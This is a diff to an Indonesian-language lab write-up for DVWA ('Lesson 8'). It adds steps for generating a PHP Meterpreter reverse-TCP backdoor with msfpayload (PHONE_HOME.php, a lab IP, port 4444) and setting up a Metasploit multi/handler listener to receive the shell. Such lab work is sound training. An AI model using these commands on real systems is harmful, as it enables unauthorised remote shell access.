@@ -1,4 +1,4 @@
-# DVWA | Lesson 5
+# DVWA | Lesson 8
 ## Konfigurasi
 
 ###{ Upload PHP Backdoor Payload }
@@ -18,15 +18,34 @@ Alamat penyerang (backtrack)
 
 
 ## Skenario
-
+![alt text](./1.png)
 - start metasploit dan backtrack yang sudah dikonfigurasi
 
 - log in backtrack dan metasploitable
-![alt text](./1.png)
+- membuat direktori backdoor, membuat msfpayload
+
+    `mkdir -p /root/backdoor`
+    `cd /root/backdoor`
+    `msfpayload php/meterpreter/reverse_tcp LHOST=10.151.34.170 ``LPORT=4444 R > PHONE_HOME.php`
+    `ls -l PHONE_HOME.php`
+
 ![alt text](./2.png)
 ![alt text](./3.png)
+ - menghapus tanda pagar yang ada di phone_home.php
+ - keluar menggunakan command :
+    `:q!' -> enter
 ![alt text](./4.png)
-![alt text](./5.png)
+
+- menjalankan command : 
+- LHOST disesuaikan dengan IP metasploit
+
+    `use exploit/multi/handler`
+    `set PAYLOAD php/meterpreter/reverse_tcp`
+   ` set LHOST 10.151.34.170`
+    `set LPORT 4444`
+    `exploit`
+    `Continue to Next Section`
+
 ![alt text](./6.png)
 ![alt text](./7.png)
 ![alt text](./8.png)
